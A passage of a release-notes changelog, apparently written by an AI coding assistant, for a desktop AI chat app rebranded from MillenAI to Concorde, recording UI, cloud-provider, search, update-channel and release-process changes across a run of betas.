  defaults to private_mode=True, and its cocoa backend implements that
  by ERASING ALL WEBSITE DATA from the default WKWebsiteDataStore at
  every window creation (cocoa.py: removeDataOfTypes_ since epoch).
  Every app launch wiped localStorage: millen.skynext (the prepared
  clip), millen.skyhist (rotation memory) and millen.sky all vanished,
  so each boot ran as a FIRST RUN — and the first-run courtesy
  restricts picks to the dark set. Result: the same space/earth clips
  forever, while fresh clips downloaded dutifully next to them.
  Fix: webview.start(private_mode=False, storage_path=app_dir()/webkit)
  — on cocoa the storage_path is ignored and persistence simply means
  "don't wipe the default store". Verified in pywebview's source, not
  the browser pane (the pane can't run WKWebView).
- COLLATERAL HEALED: every localStorage pref was silently resetting
  each launch on desktop all along — performance mode, last code
  agent, tier choice. They stick now.
- BELT + SUSPENDERS: firstEver is now also false whenever the disk
  already holds 2+ clips — a stocked pantry is proof of a veteran
  install even if storage ever gets wiped again, so the dark-set
  first-run preference can never re-trap the picker.

## 6.0 — Concorde
- THE REBRAND: MillenAI is Concorde everywhere a user looks — wordmark,
  window, tab, splash, sign-in, gate, DMG, MSI, shortcuts, README.
  One APP_NAME constant + brand() applied at the three HTML serve
  points (index, WELCOME_PAGE, GATE_PAGE); "Concorde" is 8 characters
  like "MillenAI", so every wordmark metric survived untouched.
- WHAT DELIBERATELY KEEPS THE OLD NAME (the rename-safety spine):
  app_dir()/venv paths (data continuity), CFBundleIdentifier
  com.millen.millenai (WebKit keys storage to bundle identity — the
  5.3.6 persistence win dies if this changes), CFBundleExecutable
  MillenAI (_SWAP_SCRIPT pgreps ".../MacOS/MillenAI"), MillenAI.icns/
  .ico filenames, UPDATE_REPO bigmillz/MillenAI, User-Agents, the
  Windows INSTALLDIR + registry key, and the MSI UpgradeCode (change
  it and upgrades stop replacing the old install).
- UPDATE CHAIN VERIFIED SAFE BY READING, NOT HOPE: the updater picks
  release assets by .dmg EXTENSION (never name), the swap script
  globs "$MP"/*.app and renames it onto the EXISTING bundle path, so
  a MillenAI.app updating from a Concorde DMG stays at its old path
  with the new app inside. Existing installs cross the rename without
  knowing it happened.
- brand() is a GLOBAL replace on served HTML — before shipping,
  grep the page for URLs containing the repo name (a link to
  bigmillz/MillenAI would be rewritten into a 404). Zero today.

## 6.1 — chrome
- THE LOOK (per Patrick: "greyscale… techno… not bland, not a visual
  shitshow"): every rainbow became THE SILVER RAMP (9/7/5-stop
  greyscale loops with first==last so the shimmer animations keep
  cycling) — wordmark, canvas halo, LFG drop, celebrate sweep, all
  progress shimmers, pinwheel, splash, About mark. Violet glow tints
  went neutral chrome. KEPT COLOURED on purpose: the backdrops (the
  cinema), content (maps/photos), the red error accent, and the
  red/blue chromatic-aberration flash in the letter slam — that
  glitch accent is the "still fun".
- THE FACE: nailfairy.art loads pragmatica-extended via Adobe Fonts
  (plus ibm-plex-mono — already ours). Pragmatica is licence-locked;
  Michroma is the free wide-techno stand-in. New --disp var on
  display surfaces only: hero h1, .vghost, #lfg, splash. Wide faces
  run ~1.4x — sizes stepped down (hero 132px -> clamp 8.2vw,
  vghost 22 -> 16.5) and tracking flipped positive. Michroma has ONE
  weight: bold requests would synthesize, so weights are pinned 400.
  Canvas halo font string must match the h1 face by hand — it
  measures and draws text itself. The splash window is self-contained
  and needed its own Google Fonts link or it falls back silently.
- ICON: bars now TOUCH (step == width) and BLEED — drawn overlong and
  cropped flush by the squircle mask at composite. Silver ramp,
  brightest at the diagonal. Body copy and answers keep their faces —
  readability is not a mood.

## 6.0 beta 2 — darker, hero-less
- NO IN-APP HERO BRANDING (per Patrick: "claude doesn't even have
  branding in the app"): the giant wordmark + beta-tag left the hero;
  the serif greeting stands alone over the backdrop. The canvas halo
  and h1 gradient machinery are dead code now (haloTick self-cleans
  when no h1 exists) — left in place, cheap and inert. Gauntlet
  gotcha: assert on class="h1row" absence, not the substring — the
  dead CSS selector keeps the bare string in the page.
- FRAME-WIDE WORDMARK: CONCORDE spans the sidebar edge to edge in
  Michroma caps (the NAIL FAIRY treatment) and SCALES with the
  sidebar via font-size:calc(var(--sbw)*.105). Version + controls
  moved to a slim row beneath (.vsub).
- DARKER: base tokens dropped ~8 shades (--bg #212121 -> #101013,
  panels/lines to match), the glass recipe's ground went from
  rgba(13,15,20,a) to rgba(6,7,10,a) everywhere in one replace, and
  the native window ground matches (#0a0a0c).
- STILL 6.0.0 BETA: released as v200 PRERELEASE via the APP_BETA
  path — fleet stays parked on v197; the live instance (raw tags)
  picks the beta up for remote kink-hunting.

## 6.0 beta 3 — the box and the cubes
- CLAUDE-STYLE EMPTY STATE: the composer floats mid-panel under the
  greeting, IN FLOW (a pinned top-% collided with two-line greetings,
  seen live) — #main:has(#hero) flips chat-scroll to auto-height and
  the wrap to static; with a chat open the same DOM docks back to the
  bottom untouched. The engine chip moved INSIDE the box (#crow:
  pill left, actions right) and clicking it opens the sidebar tier
  picker — with stopPropagation, because the document-level
  dropdown-closer re-adds "closed" on any outside click and undid the
  open in the same tick (caught live).
- THE CUBE WAVE replaces the chrome sweep (per Patrick: "dark techno
  party… not chrome chevrolet", after Claude Code's dithered meter):
  a canvas grid of quantized grey cells swept by one diagonal front —
  dark rumble ahead, strobing decay behind, rare white pings. Sized
  LAZILY because the viewport can measure 0 at boot. Verified by
  pixel audit (888/1280 mid-row cells lit at t=0.5, zero colored);
  the pane throttles rAF when document.hidden, so the loop needs a
  setTimeout-shimmed rAF to test there — CSS animations run in the
  pane, rAF loops do NOT.
- Old .sweep CSS stays (inert); downloads-complete celebration uses
  the cube wave too via the shared rainbowWipe path.

## 6.0 beta 4 — corner mark + the beta channel
- WORDMARK: frame-wide lasted one beta — now a gpt/gemini-style corner
  mark (Michroma 12.5px, .18em tracking) inline with the version and
  controls. The frame-wide look moved to NOTES history.
- BETA CHANNEL, THE REAL ONE: Settings grew "Beta updates — new
  builds first, kinks included" above the maintenance stack (styled
  with the checkbox family). Server: _channel_release() — stable
  reads /releases/latest (GitHub excludes prereleases), beta opt-in
  lists releases and takes the newest non-draft. Verified live on
  /api/update/check: unchecked -> 5.3.7 (v197); checked -> 6.0 beta
  (v201). Toggling ON immediately re-runs the update check so a
  waiting beta surfaces at once. download_links() (the DOWNLOAD NOW
  chip for web guests) deliberately stays stable-only.
- NB the test instance SHARES prefs.json with the desktop app —
  toggling prefs in tests must reset them (done here), or the
  desktop quietly changes channels.

## 6.0 beta 5 — settings truthfulness
- THE MISSING CHECKBOX WASN'T MISSING: beta 4's /Applications patch
  never ran — the && chain died at release.sh's TLS timeout and took
  the cp with it, while the summary still said "app patched". RULE:
  the app patch is its OWN command with its own grep-verification,
  never the tail of a release chain.
- Beta row moved to the TOP of Settings (first set-sec, above
  Personality) with the running version baked in ("you're on 6.0
  beta") — discoverable without scrolling past the cloud card.
- FOLDING POWER: the fleet box hides when Contribute is unchecked;
  the frontier-cloud key card hides when Use cloud power is
  unchecked; both restore on re-check (verified with dispatched
  change events both directions) and populate folded/open from prefs
  when Settings opens.

## 6.0 beta 6 — version says which beta
- short_version() carries the BUILD in beta: "6.0 beta 203" — window
  title, tab, About header, splash, corner vsub all agree, and each
  beta release visibly increments. No derived "beta N" counting; the
  build number IS the beta number.
- The opt-in checkbox settled under "Check for updates" (adv-grid:
  updates → check → Include Beta Releases → forget), label shortened
  to exactly that. Top-of-settings placement lasted one beta —
  betas are for finding this out.

## 6.0 beta 205 — slim rail, engine menu, Hermes
- SIDEBAR defaults 384 -> 300px (was ~30% of the window); dblclick
  reset and the --sbw fallback follow. SB_MIN 210 still governs.
- ENGINE MENU: clicking the composer's "engine" pill drops a glass
  card RIGHT THERE — emoji + name + desc per tier (TIER_META token),
  hover reuses showTierPop so the bubble lists the actual resolved
  models, click picks. Positions below the chip on the empty state,
  above when docked. The document dropdown-closer learned about it.
  The old behavior (chip opened the SIDEBAR rows) is gone.
- HERMES, the infamous one: first-class agent (🪽, first among the
  specialists), picks Hermes 3 8B first. The system prompt sets TONE
  not permissions — direct, opinionated, no disclaimers, refuses in
  one sentence when it must. Verified live: "is a hot dog a
  sandwich" -> flat "No," one argument, zero hedging, on Hermes 3 8B.
- AGENT POPUPS: hovering any specialist row shows a tierpop-style
  card (icon, desc, top picks) from the AGENT_META token — the
  "popup description" ask, and it covers every agent, not just
  Hermes.

## 6.0 beta 206 — answers that look like Claude's
- THE ASK (per Patrick, with a side-by-side): "diagrams and code etc
  in different font/color/typeface". Three layers shipped:
  1. RENDERER — flow fences become REAL diagrams: 'A -> B' edges with
     optional '(note)' per node, layered by longest-path topology,
     glass boxes + SVG bezier wires with arrowheads (wireFlow runs
     post-layout and on resize; edges URI-encoded in a data attribute
     because esc() leaves double quotes alone and the JSON truncated
     the attribute at its first quote — seen live). Code fences became
     language-labeled CARDS with a four-class mini-highlighter
     (keywords/strings/comments/numbers, input pre-escaped). Ordered
     lists and setext headers (text over -----, which small models
     love and which rendered as stray hr's) now parse.
  2. CSS — inline code went warm (#e8a08f) against the serif, token
     colors are quiet blues/greens/golds, code cards get a mono
     language bar.
  3. PROMPT — SYSTEM_PROMPT teaches the flow syntax and demands
     language-tagged fences; Gemma-class models follow it, the
     smallest ones won't always. The renderer is verified against the
     reference; model ADOPTION varies by model — the remaining kink.
- Pane gotchas again: rAF throttling means wireFlow needed manual
  driving to verify there. Also: never put backticks in a git commit
  -m double-quoted string — command substitution eats the chain.

## 6.0 beta 207 — the stand, the gear, the type
- BRAND: the icon's silver diagonal bars (no tile) lean against the
  first C like a stand — inline SVG with the icon's gradient, 15px,
  2px off the C. Gear moved OUT of the brand row to the far right of
  the Performance mode line (#settings became a flex row; the gear
  keeps its own click handler so it opens Settings, not the toggle).
  New chat stays beside the version.
- TYPE: answers left the serif. Precise sans stack (-apple-system /
  SF Pro Text first), 14.75px / 1.7 / -.006em — the "line gaps"
  complaint was Georgia's uneven vertical rhythm; SF's metrics read
  like Claude Code. Serif remains only in the hero greeting (the
  charm) — code/tables/chips keep their own faces.
- SHELL LESSON No. 2 this beta line: a bare "cat >> file" with no
  input hangs reading stdin — it ate a 10-minute timeout between the
  gauntlet and the release.

## 6 beta 208 — version numbers that say something
- UPDATE OFFERS name both beta builds: check_update appends the tag's
  build when the release title ends in "beta" ("6 beta 208"), and
  "current" ships as short_version() — so the dialog reads
  "6 beta 208 • you have 6 beta 207", never "6.0.0 to 6.0.0".
- TRAILING-ZERO TRUNCATION everywhere a version is DISPLAYED:
  short_version() loops off .0s — 6.0.0 -> 6, 6.1.0 -> 6.1, 6.1.1
  untouched. Artifacts/compare paths still use APP_VERSION raw.
  The same truncation applies to the numeric part of release titles
  in the offer.

## 6 beta 209 — agents pulled
- THE AGENTS TAB AND SPECIALIST LIST ARE GONE (per Patrick: "until i
  get the logistics of that sorted"). Two tabs again — Chat | Code —
  glide back to halves. DORMANT, NOT DELETED: the AGENTS dict,
  AGENT_META, showAgentPop and the Hermes definition all stay live
  (the Code tab's Coding/Workspace rows and their hover cards run on
  the same machinery). SHOW_AGENTS=False marks the intent; re-adding
  is the b205 markup + the thirds glide from git history.
- LANES: chats born in the agents lane fold into the Chat list while
  the tab is gone (laneOK: code vs not-code) — nothing a user made
  vanishes from every list. The Hermes hot-dog chat survives visibly.
- Inert leftovers kept on purpose: #agents-wrap CSS rules (no matching
  DOM) and the __AGENT_ROWS__ token replace (no token in the page).
- POST-SHIP CATCH on b209: the release chain ran DESPITE a red
  scorecard — `tests | tail -2` reports TAIL's exit code, not the
  gauntlet's. The failure was only my stale 5.2 three-tabs check
  contradicting the new halves check (page was correct), but the hole
  was real. Gauntlet now runs unpiped (redirect to a log, tail after)
  so a red scorecard actually stops the train.

## 6 beta 210 — one line, one size
- Wordmark and version now share 12.5px and a baseline: .vsub came up
  from 9.5px, tracking matched at .18em, and #brand-row switched to
  align-items:baseline (buttons opt back to center) — the version no
  longer floats above the wordmark's line.

## 6 beta 211 — the brand row settles
- The new-chat button now sits on the TEXT's axis: brand-row is
  nowrap + center (baseline flex parked the text high against the
  28px button — measured mids 29/29/29 after). The version never
  drops or wraps: white-space:nowrap + ellipsis as the cramped-width
  fallback, and enough width reclaimed (vsub tracking .06em, gaps
  5px, buttons 26px, wrap padding 2px) that the full "6 beta 210"
  fits untruncated at the 300px default.
- Lesson that cost four rounds: flex baseline + tall centered
  siblings + flex-wrap is a three-way trap — measure mids, not vibes.

## 6 beta 212 — the key that "didn't work"
- GEMINI RETURNS 400 FOR A BAD KEY, not 401 (verified live against
  the OpenAI-compat endpoint with a fake key: 400 INVALID_ARGUMENT
  "Please pass a valid API key" — the model id is irrelevant
  pre-auth). So "HTTP Error 400: Bad Request" almost always means
  the KEY, not our request.
- The validator now surfaces the provider's OWN error message from
  the response body, plus a shape hint: Gemini keys start with AIza
  and are exactly 39 chars — a shorter one means the paste was cut
  (the masked field in Patrick's screenshot showed ~22 dots).

## 6 beta 213 — cloud that discovers itself
- THE REAL b212 BUG, surfaced by b212's own error fix: Google retired
  gemini-2.5-flash FOR NEW USERS — Patrick's 53-char key was fine
  (and the 39-char hint was wrong: keys come longer now; the hint
  only fires under 35 chars as a truncation smell).
- RETIREMENT-PROOF SAVE: /api/cloud/set now LISTS models with the
  key first (auth check + inventory in one call), filters to
  chat-capable ids, picks by preference ladder (gemini-3-flash →
  flash-latest → 2.5 → any flash → pro; groq/claude have their own),
  THEN runs the 1-token probe on the pick. A retired default can
  never brick a save again. Inventory stored in cloud.json.
- UI (per Patrick): "FRONTIER" dropped from the card; under the key
  box, the model list — grey possibilities per provider before a key,
  the REAL inventory in white with green ✓ once live, "· in use" on
  the active one. Old configs without an inventory stay grey until
  re-saved (a configured key with no model list must NOT check
  placeholder names — caught live).

## 6 beta 214 — LFG retired
- THE WHOLE MOMENT IS GONE (per Patrick: "entirely"): the #lfg
  element, the letter-cascade wash and its five keyframe families,
  the sparks, the splash's LFG line, the __SPLASH_LFG__ token and its
  sessionStorage dedupe. Grep says zero refs in source AND the served
  page; the boot (cube wave -> reveal -> greeting) runs clean without
  it — painted/paintdone land, no console errors.
- It was born in 3.x as the loading-bar payoff and got its own drop
  in 5.2. Pour one out; the greeting carries the personality now.
- b214 FOLLOW-UP: one straggler survived the sweep — "Let's fucking
  go." in the GREETING ROTATION (lowercase; the removal grep was
  case-sensitive). Gone now, and the gauntlet check went
  case-insensitive. Sweeps grep -i or they aren't sweeps.

## 6 beta 216 — fenced tables + the live label
- FENCED PIPE TABLES render as REAL tables: models constantly wrap
  tables in bare fences (seen live: UberX costs as mono soup with $7
  gold-highlighted as a number token). The fence handler detects an
  all-pipe-rows body with a divider (bare/md/text/table langs only)
  and emits the styled table; real code stays a code card.
- THE MODEL LABEL IS LIVE (per Patrick: no Gemma-as-compositor
  credit): whoLive() mirrors each STATUS into the .who slot — the
  council's CURRENT model while it runs, "compositing…" during the
  merge (the status no longer names the merger), and at rest singles
  keep their model name while councils settle to the TIER (the
  last-runner name was sticking, which recredited Gemma — caught
  live). Verified through a full Thinking run.
- PROCESS INCIDENT, fully owned: this release shipped from an
  UNGUARDED chain — a heredoc inside a && chain ends the chain, so
  everything after the heredoc ran unconditionally while the gauntlet
  had actually CRASHED (ConnectionResetError: it collided with the
  verification generation still holding the engine). A clean re-run
  came back 59/59 so v216 stands, but the rules are now: (1) the
  gauntlet gets a QUIET instance, never one mid-generation; (2) NO
  heredocs inside release chains — NOTES first, then gauntlet, then
  release, each its own command with its exit code checked.

## 6 beta 217 — the brand row, engine-proof
- Patrick's b212 screenshot showed the b210/211 "fixed" alignment
  still broken IN THE APP — Blink and WKWebView compute different
  line boxes for Michroma vs Plex Mono, so flex centering that
  measured 29/29/29 in the pane landed differently in WebKit. Fourth
  round on this row; the flex approach is abandoned.
- THE INVARIANT FIX: the version moved INSIDE the wordmark's span —
  one inline formatting context = one shared baseline, in every
  engine, by CSS law rather than by metric luck. vsub is 13px mono
  (caps optically match Michroma 12.5 caps), the combined span
  ellipsizes as one unit, buttons flex beside it.
- screencapture(1) needs Screen Recording permission — no Safari
  screenshots from the harness shell; WebKit checks ride on
  construction-level invariants or Patrick's own eyes.

## 6 beta 218 — the provider board
- THE CLOUD CARD'S LIST IS PROVIDERS NOW, not models (per Patrick):
  three fixed rows — Gemini / Groq / Claude — grey until a key is
  saved, green ✓ (with "· in use" on the active one) when its key
  works, red ✗ with the provider's reason when it doesn't. The rows
  never change with the dropdown.
- MULTI-KEY STORAGE: cloud.json became {providers:{id:{...,status,
  note}}, active} — adding a Gemini key no longer overwrites the
  Groq one. Legacy single-provider files wrap transparently on read
  (provider inferred from the base URL; Patrick's real Groq config
  migrated live without a touch). cloud_conf() still returns the
  classic single-provider shape for everything downstream, so
  cloud_stream and the tiers never knew anything changed. Failed
  saves are RECORDED (status fail + note) so the ✗ persists with its
  reason instead of evaporating with the toast.
- Verified end-to-end on the shared store: fake Gemini key -> ✗ row
  with "Please pass a valid API key" while ✓ Groq · in use stayed
  put; probe entry removed from the real config afterwards.

## 6 beta 219 — the cloud pulls its weight
- THE ASK (per Patrick: "use the cloud models to their fullest…
  offload as much as possible"): cloud was only wired into Fast's
  single-model path. Now, on every council run with "Use cloud
  power" on:
  1. THE CLOUD BENCH — every provider with a working key drafts IN
     PARALLEL with the local loop (threads kicked before it, joined
     after, 75s cap). Frontier voices join the council at zero local
     cost; failures record "(no answer — cloud)" and never block.
  2. CLOUD DRAFTS OUTRANK locals in the merge feed (rank -1) so the
     top-5 trim can't drop them.
  3. THE COMPOSITE OFFLOADS — the merge (the heaviest single step,
     and the one that writes the final text) runs on the ACTIVE
     cloud model; local Gemma remains the no-key/failure path
     untouched. X-Models carries the bench so whoLive and the where
     badge label it right.
- THE BUBBLE: "answers blended by Gemma" becomes "✓ Cloud Enabled"
  (green check) whenever configured+turbo — key-less machines keep
  the old texts.
- Verified live with Patrick's real Groq key: Thinking run showed
  compositing… then settled to tier, and the meta badge read CLOUD —
  the composite came from Groq's 120B, not local Gemma.

## 6 beta 220 — the bench and the ladder
- PATRICK'S QUESTION ("will this still use gemma 4 to composite?")
  had the right instinct and an outdated premise: Gemma 4 was only
  ever the best LOCAL compositor. With frontier keys live the answer
  is a LADDER, not a name.
- CLOUD BENCH v2: each working provider fields its picked model PLUS
  one alternate from its stored inventory (pro/120b/70b-class
  preferred), capped at two per provider for free-tier rate limits —
  all drafting simultaneously with the local loop. On Patrick's real
  config that's Groq 120B + Gemini 3 Flash + Gemini 2.5 Pro, three
  frontier drafts beside three local ones.
- COMPOSITOR LADDER: Claude -> Gemini (auto-upgraded to its pro
  model when the inventory has one) -> Groq -> local Gemma 4 as the
  floor. First non-degenerate result ships; every failure falls
  through. cloud_bench()/compositor_ladder() are shared by
  run_council and the X-Models header so the who-label and drafts
  panel name the frontier voices correctly.
- Verified live on real keys: Thinking run -> cloud badge, tier at
  rest, and the final text reads like the pro model that wrote it.

## 6 beta 221 — the bench is visible (and Opus is off it)
- PATRICK'S QUESTION ("also use cloud for the council, or just
  compositing?") was answered by b219/220 — both — but the tier
  bubble only listed local models, so the bench was invisible.
  Council bubbles now seat the cloud voices too ("Groq 120B · cloud"
  rows under the locals), fed by /api/cloud's new bench field.
- COST BUG CAUGHT BY THE NEW BUBBLE: Patrick added a Claude key, and
  the blind alternate-picker benched claude-opus-5 — a paid,
  premium-priced draft on EVERY council question. Alternates are now
  free-tier-only (Gemini/Groq); Anthropic fields one seat and earns
  its keep at the top of the compositor ladder instead. All three
  providers ok: bench = Groq 120B, Gemini, gemini-2.5-pro, Claude;
  ladder = Claude -> gemini-2.5-pro -> Groq 120B -> local Gemma.

## 6 beta 222 — the About window grows up
- POWER reordered (per Patrick): Use cloud power + the key card
  first, Contribute GPU power below it. The "CLOUD FREE KEY · 2
  MINUTES" header is gone — the card explains itself.
- FLEET COPY: the "Your fleet: 0 friends online / contributing" trio
  collapsed into one grey-italic line, "Contributing to N users"
  (N = live hub users from /api/stats). fleet-own and its CSS
  removed; pending-approval requests still render.
- THE LOGO IS A BANNER: the About icon is the dock icon's diagonal
  stripes stretched across the card — seven 45° silver strokes,
  gradient fading in from the left edge and out at the right,
  full-width viewBox with preserveAspectRatio none.
- SELF-INFLICTED: a malformed replacement string in the edit script
  landed mid-file and broke the fleet JS into an unterminated string
  (caught by inspection before it shipped). Rule reinforced: every
  scripted edit batch gets a page-load check before anything else.

## 6 beta 223 — the drip, the pinwheel, the honest label
- SMOOTH UNFOLDING (per Patrick: "not chunks magically appearing"):
  network chunks land in `full`; a paced rAF animator reveals toward
  the backlog (rate eases at lag*0.055, min 2 chars/frame), so text
  flows like typing. RESET replays the replacement smoothly. Stream
  end waits up to 1.8s for the reveal to catch up (hidden windows
  throttle rAF — then it snaps, which nobody sees).
- THE CARET IS DEAD: streaming text ends in the pinwheel (.scaret)
  instead of a blinking block. The tree spinner grew to 17px and is
  flex-centered against the bar.
- THE LABEL SPEAKS PLAINLY: dedicated RUN markers (not
  status-sniffing) drive it — "Running… a, b" listing every
  simultaneously active voice (bench threads + local loop each
  narrate add/remove under a lock), then "Compositor: name" as the
  ladder tries each rung (the marker that sticks is the one that
  wrote the answer). Singles emit their own RUN. Verified live with
  a shimmed-rAF run: Running… -> Compositor: claude-sonnet-5, text
  growing 0 -> 34 -> 238 progressively.

## 6 beta 224 — search asks first, apologizes never
- NOT A REGRESSION (verified before touching anything): search fired
  and returned sources for triggering queries on both tiers. The gap
  was the TRIGGER — needs_search wanted a freshness word or a
  quality-word+place-noun pair, so "what sound system does nowadays
  use" matched nothing and the model answered from memory with an
  "I can't browse the web" apology (Patrick's screenshot).
- INVERTED THE DEFAULT: a real question about the world now searches.
  _WORLDLY_RX (leading question word, or an explicit ask for facts/
  specs/reviews/comparisons, or a trailing "?") triggers, guarded by
  _SELF_CONTAINED — translate/rewrite/summarize/refactor/debug/
  creative-writing and "this code|my essay" phrasing never search,
  because that work carries its own context.
- Battery-tested 17 prompts (8 should / 9 shouldn't): all correct.
  End-to-end on Fast, the exact failing question now reports
  X-Web-Search: 1 and "Searched the web · 4 sources".

## 6 beta 224 — one bar, one tree
- TWO BARS WAS ONE TOO MANY (per Patrick): the council's .blendprog
  bar (with its own 150ms ticker) sat above the worktree card, which
  already had a bar. blendprog is retired — paintDrafts' live branch
  now just clears it; the finished-state "N of M models contributed"
  chip is untouched.
- COUNCIL PROGRESS MOVED INTO THE TREE: the "asking X · i of n"
  status becomes a step row, "Consulting models · 2 of 3", in
  STEP_ORDER between geo and draft. One bar on top, every stage
  listed beneath it — the Claude shape.
- DEDUPED: the "searched the web" chip row only renders once real
  source chips exist (it used to echo the tree's search row while
  empty), and the bare status line yields whenever a worktree is
  present.
- Verified live: a search+council run showed bars=1 and steps
  [Searched the web · 5 sources / Read the pages · 1 image /
  Located it on the map / Consulting models · 2 of 3].

## 6 beta 225 — say it once
- THE LAST ECHO: srcRow still opened with its own "🌐 searched the
  web" label above the chips, so the phrase appeared twice whenever
  sources landed (tree row + chip label). The label is gone and its
  CSS with it — the tree reports WHAT happened ("Searched the web ·
  5 sources"), the chips report WHERE (clickable favicon+domain).
  Informative, not repetitive.
- POWER header removed from Settings; only Personality keeps a
  micro-header now, and the cloud/contribute controls stand on their
  own like the maintenance rows do.
- Verified live: a Fast search run counts exactly ONE "searched the
  web" in the whole message, 5 source chips, 1 bar.

## 6 beta 226 — a bar that means something
- ONE SPINNER, AND IT'S A RING: the ✱ glyph is retired for a real CSS
  circular spinner (.cspin — 15px, bright top arc on a dim track,
  0.7s spin, stilled in perf mode). The trailing text caret-spinner
  is gone entirely; the tree head owns the only one (or the status
  line before a tree exists — never both).
- THE BAR IS HONEST NOW. It used to be done/steps.length, so the
  first finished step read 100% and then sat there. Replaced with a
  weighted plan built at stream start from facts we actually have:
  the X-Web-Search header and the model lineup tell us whether this
  run will search (search/read/geo) and whether it's a council, and
  each phase carries a weight (search 10, read 10, geo 5, council 35,
  draft 30, polish 8).
  * the RUNNING phase gets real sub-progress: council reads its
    "i of n", drafting uses streamed characters on a saturating
    curve (1-exp(-chars/900)).
  * between milestones it CREEPS on a decaying curve toward — never
    past — the next checkpoint, repainted on a 600ms clock so a
    silent 20s model load still shows life.
  * capped at 96% until the stream truly ends, then exactly 100 (a
    planned phase that never materialises, e.g. geo on a non-place
    question, must not hold it short).
- Measured end to end: search-done 10% -> council 1of3 aged 21% ->
  drafting@1500 chars 71% -> finished 100%, monotonic throughout.

## 6 beta 227 — the length dial
- A 1-5 RESPONSE LENGTH SLIDER under Personality's Save button
  (Brief / Short / Balanced / Detailed / In depth), persisted as
  prefs.length, appended to the dated system prompt as a LENGTH
  clause. Level 3 writes NOTHING — the prompt's own calibration is
  the neutral default, so the dial only speaks when the user moved
  it.
- EACH RUNG NAMES A SHAPE, NOT A MOOD: "two or three sentences",
  "one or two tight paragraphs", "several developed paragraphs",
  "up to several pages with headings" — concrete instructions hold
  where adjectives drift. The long rungs carry an explicit
  anti-padding clause ("every paragraph must carry new information…
  if you have said everything worth saying, stop there") so depth
  never becomes rambling. No token ceilings were touched: local
  models run to their natural stop and 4096 already allows ~6 pages,
  so trimming max_tokens would only truncate mid-sentence.
- MEASURED, not assumed: identical question ("how does espresso
  differ from drip coffee?") returned 616 chars at level 1 and 2623
  at level 5 — a 4.3x spread from one dial.

## 6 beta 228 — Funnels
- A THIRD TAB (Chat | Code | Funnels; glide back to thirds). The
  sidebar form asks Patrick's five questions — decision,
  requirements, prompt type (text/images), options per prompt (2-6),
  stages (1-20) — and "Start funnel" runs it in the main panel.
- HOW IT WORKS: /api/funnel is stateless; the CLIENT owns the path.
  Each call sends {goal, reqs, opts, stages, images, picks[]} and
  gets back one stage — a short question plus N option cards (label +
  one-clause tradeoff), generated as strict JSON by the cloud when a
  key is live, else the best local model. Picking appends to picks[]
  and asks for the next stage, so each stage is CONDITIONED on the
  whole path. Past the last stage the same endpoint returns a
  recommendation instead of options.
- IMAGE MODE IS HONEST: nothing is generated. Each option gets a real
  photo harvested from the web via the existing og:image pipeline
  (_page_text appends image URLs as plain strings — corrected my
  first pass, which assumed dicts).
- Funnels are chats in their own lane, so they group in history and
  never mix with Chat or Code.
- Verified end to end on a real decision: stage 1 offered Bushwick /
  Sunset Park / East Flatbush with rent-and-subway tradeoffs; by
  stage 3, conditioned on earlier picks, it offered three specific
  Wyckoff Ave addresses with rents inside the stated $5k budget, and
  the finish returned a single recommendation with a next step.
- b228 FOLLOW-UP: the funnel form leaked into Chat and Code. Cause is
  a CSS-vs-HTML precedence trap — `hidden` is only `display:none`
  from the UA stylesheet, so the author rule `#funnel-wrap{display:
  flex}` outranked it and the element stayed visible no matter what
  modeShow set. #agents-wrap/#code-wrap never declared `display`,
  which is why they were never affected. Added
  `#funnel-wrap[hidden]{display:none}`. RULE: any wrap that sets
  `display` needs its own `[hidden]` rule. Verified across all four
  tab transitions — each lane shows only its own controls.

## 6 beta 230 — the funnel row lines up
- A <select> and an <input type=number> have DIFFERENT intrinsic
  heights, and the number carries spin buttons on top — so the three
  boxes could never match by accident. All of it is stated now:
  height 32px, box-sizing border-box, appearance:none, zero margin,
  matching padding/line-height, spin buttons suppressed, and one
  shared inline-SVG chevron so both selects use the same arrow
  instead of the two native ones. Grid gained align-items:end and a
  slightly wider gap; focus lightens the border on all three.
- Measured: all three boxes 32px tall with identical top and bottom
  edges.

## 6 beta 231 — the length slider gets dressed
- THE b227 SLIDER CSS NEVER SHIPPED: its insertion anchor didn't
  match, so `.replace()` silently no-op'd and the control fell back
  to the native blue iOS slider with a big sans label. Third silent
  no-op in this line — from here scripted CSS inserts assert the
  anchor exists AND assert the result changed.
- Now: 2px hairline track full width (290px in the panel), 11px
  round thumb that scales slightly on hover, native appearance reset
  on track and thumb for both WebKit and Gecko. The label is the
  window's standard micro-header — IBM Plex Mono 9px, .18em, uppercase,
  --faint — measured EQUAL to the PERSONALITY header's computed
  font, size, tracking and colour, with the value right-aligned in
  --dim.

## 6 beta 232 (pending release) — the ZITO override
- Hold Z, I, T and O together anywhere in the app and the chrome falls
  away to a mission-control board. It is an easter egg, but not a fake
  one: every panel is fed by the endpoints the real UI already uses.
  Spokes are the models `/api/engines` reports UP (biggest nine by
  memory) plus each cloud provider whose status is `ok`; the ticker
  carries measured latency, real memory/GPU from `/api/stats`, the live
  tier and key count; the left roster is real subsystem state (facts in
  memory, clips in the pantry, fleet peers, workspace root, updater
  version). The only invented figures are the ones that are obviously
  jokes — `ui unbeatable`, `vibes`, and the three `wip` checkboxes.
- The terminal runs a REAL query. It posts to `/api/chat` like send()
  does and narrates the same wire markers: STATUS, STEP, RUN, DRAFT,
  SOURCES, RESET. Token counts come from the draft payloads, timings
  from the clock. Nothing is scripted.
- WIRE PARSING: send() re-runs its regexes over the whole buffer every
  chunk and relies on idempotent handlers. The terminal needs each
  marker exactly ONCE, so it consumes frames instead — scan for
  `\0`, find the closing `\0`, emit, slice; a trailing partial frame is
  held back rather than printed. Half a marker never reaches the screen.
- The combo types four letters into whatever had focus, so engaging
  strips up to four trailing z/i/t/o characters back off the focused
  field and re-fires its `input` event. Escape closes the terminal,
  Escape again stands the board down — wired through `window.zitoEsc()`
  so the existing Escape chain asks it first and is otherwise untouched.
- Right rail: only the log panel flexes (`.pb.grow`); the code board and
  mission control size to content, otherwise the bottom meter was
  cropped off. The log is `justify-content:flex-end` so overflow spills
  off the TOP and the newest line is always the visible one.
- Debug lines written after the answer block exists are inserted ABOVE
  it (`zAnchor`), so the transcript reads dispatch → answer → close
  instead of interleaving draft/polish steps under the prose.
- Everything is scoped under `#zito` with its own `--z*` palette and
  carries no dependency on the app's tokens — deliberately single-theme,
  that screen is always night.
- Verified live: board built from 12 real spokes, Thinking-tier run
  (7 models, web on, 4 sources, claude-sonnet-5 composite, 49s) and a
  Fast-tier run (Claude, 3.6s) both narrated end to end; letter-strip,
